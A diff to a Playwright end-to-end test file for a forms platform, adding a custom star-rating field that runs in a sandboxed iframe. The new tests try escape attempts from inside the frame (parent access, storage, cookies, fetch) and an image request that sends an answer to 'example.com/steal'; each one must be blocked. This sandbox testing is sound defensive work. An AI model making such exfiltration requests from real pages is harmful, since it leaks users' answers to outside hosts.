@@ -1,7 +1,7 @@
 import { execFileSync, spawn, type ChildProcess } from 'node:child_process';
 import { join } from 'node:path';
 import { expect, test } from '@playwright/test';
-import { PORTS, readState, ROOT } from '../stack';
+import { API, PORTS, readState, ROOT } from '../stack';
 import { call, createOrg, formUrl, label, signIn, submissions, watchForProblems, type Org } from './helpers';
 
 /**
@@ -87,6 +87,7 @@ test('an admin sees the extension once it is running, and what it offers', async
   await expect(named).toContainText('Score the risk — Scores a request from its amount · returns score, band');
   await expect(named).toContainText('Branches — Our branches, by city · filtered by city');
   await expect(named).toContainText('GST number is genuine');
+  await expect(named).toContainText('Star rating — One to five stars; the answer is the number');
   // Nothing on the page says where it runs or what its secret is.
   await expect(page.locator('body')).not.toContainText('127.0.0.1');
   expect(operator('list', org.orgId)).toContain('Acme rules  (1 steps, 1 lists, 1 checks)');
@@ -122,6 +123,11 @@ test('a designer uses it from the builder: its step, its list, and its check tic
   await page.getByRole('tab', { name: 'Options' }).click();
   await expect(page.getByRole('combobox', { name: 'Data source' })).toContainText('Acme rules · Branches');
 
+  // A field drawn by their own code is in the palette; with one on offer it needs no choosing.
+  await page.getByLabel('Field palette').getByRole('button', { name: 'Custom field' }).click();
+  await expect(page.getByRole('combobox', { name: 'Which field' })).toContainText('Acme rules: Star rating');
+  await page.getByLabel('Label', { exact: true }).fill('Rate our service');
+
   await page.getByRole('button', { name: 'Publish' }).click();
   await page.getByRole('alertdialog').getByRole('button', { name: 'Publish' }).click();
   await expect(page.getByText(/Published LOAN_REQUEST v1/)).toBeVisible();
@@ -143,6 +149,19 @@ test("someone filling the form meets the organisation's code: options, a refusal
   await expect(page.getByRole('option')).toHaveText(['Pune Camp', 'Pune Kothrud']);
   await page.getByRole('option', { name: 'Pune Kothrud' }).click();
 
+  // Their own field: drawn by their code inside a locked frame, answered by clicking in it.
+  const stars = page.frameLocator('iframe[title="Rate our service"]');
+  await stars.getByRole('button', { name: '4 stars' }).click();
+  await expect(stars.getByRole('button', { name: '4 stars' })).toHaveAttribute('aria-pressed', 'true');
+  await expect(stars.getByRole('button', { name: '5 stars' })).toHaveAttribute('aria-pressed', 'false');
+  // What that code cannot do, tried from inside the frame itself.
+  const inside = page.frames().find((f) => /\/public\/extensions\//.test(f.url()))!;
+  expect(await inside.evaluate(() => { try { return String(window.parent.document.title); } catch { return 'denied'; } })).toBe('denied');
+  expect(await inside.evaluate(() => { try { window.localStorage.setItem('a', 'b'); return 'allowed'; } catch { return 'denied'; } })).toBe('denied');
+  expect(await inside.evaluate(() => { try { return document.cookie === '' ? 'empty' : 'has cookies'; } catch { return 'denied'; } })).toBe('denied');
+  expect(await inside.evaluate((url) => fetch(url).then(() => 'sent', () => 'blocked'), `${API}/health`)).toBe('blocked');
+  expect(await inside.evaluate(() => new Promise((done) => { const i = new Image(); i.onload = () => done('loaded'); i.onerror = () => done('blocked'); i.src = 'https://example.com/steal?answer=4'; }))).toBe('blocked');
+
   // A GST number that looks right but whose check digit is wrong: only code can tell.
   await page.getByLabel(label('GST number')).fill('27AAPFU0939F1ZX');
   await page.getByRole('button', { name: 'Submit' }).click();
@@ -156,10 +175,11 @@ test("someone filling the form meets the organisation's code: options, a refusal
   const formId = forms.find((f) => f.code === 'LOAN_REQUEST')!.id;
   await expect.poll(async () => (await submissions(org, formId))[0]?.status, { timeout: 15_000 }).toBe('REVIEW');
   const stored = (await submissions(org, formId))[0]!;
-  expect(stored.payload).toMatchObject({ branch: 'PUN-KOTHRUD', gstin: '27AAPFU0939F1ZV' });
+  expect(stored.payload).toMatchObject({ branch: 'PUN-KOTHRUD', gstin: '27AAPFU0939F1ZV', custom_1: '4' });
   const record = await call<{ events: { message: string }[] }>(200, `/records/${stored.uuid}`, { token: org.token });
   expect(record.events.some((e) => e.message.includes('Risk HIGH (90)'))).toBe(true);
-  expect(problems).toEqual([]);
+  // The only complaints allowed are the browser's own, about what the frame was refused above.
+  expect(problems.filter((p) => !/Content Security Policy|Refused to|sandboxed|SecurityError/i.test(p))).toEqual([]);
 });
 
 test('while the extension is down the form says so kindly and takes nothing; when it is back it works again', async ({ page }) => {
